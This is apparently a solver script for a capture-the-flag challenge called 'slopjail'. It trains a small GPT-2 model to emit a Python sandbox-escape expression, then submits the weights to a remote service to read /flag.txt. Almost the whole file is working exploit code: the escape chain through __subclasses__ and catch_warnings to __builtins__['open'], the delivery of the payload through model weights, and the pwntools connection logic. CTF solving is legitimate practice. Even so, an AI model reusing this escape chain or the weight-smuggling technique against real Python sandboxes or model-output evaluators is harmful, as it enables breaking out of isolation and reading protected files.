#!/usr/bin/env python3
from pwn import remote
import argparse
import re
import torch
from transformers import GPT2Config, GPT2LMHeadModel, PreTrainedTokenizerFast
from safetensors.torch import save_file
import tempfile
import os

HOST = "slopjail.ctf.ritsec.club"
PORT = 1900

EXPR = "[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['open']('/flag.txt').read()"


def build_payload_bytes() -> bytes:
    torch.manual_seed(0)
    tok = PreTrainedTokenizerFast.from_pretrained("model")
    seq_ids = [tok.bos_token_id] + tok.encode(EXPR, add_special_tokens=False) + [tok.eos_token_id]
    seq = torch.tensor([seq_ids], dtype=torch.long)

    cfg = GPT2Config.from_pretrained("model")
    cfg.attn_pdrop = 0.0
    cfg.embd_pdrop = 0.0
    cfg.resid_pdrop = 0.0

    model = GPT2LMHeadModel(cfg)
    opt = torch.optim.AdamW(model.parameters(), lr=2e-3)

    for step in range(5000):
        model.train()
        out = model(input_ids=seq, labels=seq)
        loss = out.loss
        opt.zero_grad()
        loss.backward()
        opt.step()

        if step % 100 == 0:
            model.eval()
            with torch.no_grad():
                gen = model.generate(
                    torch.tensor([[tok.bos_token_id]]),
                    max_new_tokens=256,
                    do_sample=False,
                    pad_token_id=tok.pad_token_id,
                    eos_token_id=tok.eos_token_id,
                )
                text = tok.decode(gen[0, 1:], skip_special_tokens=True)
            if text == EXPR:
                break

    # Serialize as safetensors and return bytes
    model.eval()
    sd = {k: v.detach().half().cpu() for k, v in model.state_dict().items()}
    with tempfile.NamedTemporaryFile(delete=False, suffix=".safetensors") as tf:
        tmp_path = tf.name
    try:
        save_file(sd, tmp_path)
        with open(tmp_path, "rb") as f:
            data = f.read()
    finally:
        os.unlink(tmp_path)

    if len(data) > 500000:
        raise RuntimeError(f"payload too large: {len(data)} bytes")
    return data


def exploit(team_token: str):
    payload_hex = build_payload_bytes().hex().encode()

    io = remote(HOST, PORT, timeout=30)
    io.recvuntil(b"Enter your CTFd team token: ")
    io.sendline(team_token.encode())

    # Wait until challenge prompt
    buf = b""
    while b"gimme slop: " not in buf:
        chunk = io.recv(timeout=60)
        if not chunk:
            raise RuntimeError("connection closed before challenge prompt")
        buf += chunk

    io.sendline(payload_hex)
    resp = io.recvall(timeout=90)
    out = (buf + resp).decode(errors="ignore")

    m = re.search(r"RS\{[^}\n]+\}", out)
    if not m:
        raise RuntimeError("flag not found in output")

    flag = m.group(0)
    print(f"<FLAG>{flag}</FLAG>")


def main():
    parser = argparse.ArgumentParser(description="slopjail solver")
    parser.add_argument("--token", required=True, help="CTFd team token")
    args = parser.parse_args()
    exploit(args.token)


if __name__ == "__main__":
    main()
